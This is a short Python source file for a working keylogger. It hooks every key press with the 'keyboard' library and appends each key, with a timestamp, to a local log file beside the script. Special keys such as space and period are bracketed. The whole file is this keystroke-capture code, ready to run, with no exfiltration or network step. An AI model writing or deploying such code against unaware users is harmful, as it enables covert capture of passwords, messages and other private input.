import keyboard ,os
import datetime

def writer(data):
    path = os.path.dirname(os.path.realpath(__file__))
    logpath = os.path.join(path,"log",'log.txt' )
    time = datetime.datetime.now()
    result = f'{time}\t:{data}\n'
    with open(logpath,"a") as file:
        file.write(result)

def filter(char):
    if char == "space":
        return "[SPACE]"
    elif char == '.':
        return "[.]"
    elif len(char) > 1:
        return "[%s]" % char
    else:
        return char

def logger(event):
	writer(filter(event.name))
	print('starting')

def run():
    keyboard.on_press(logger)
    keyboard.wait()
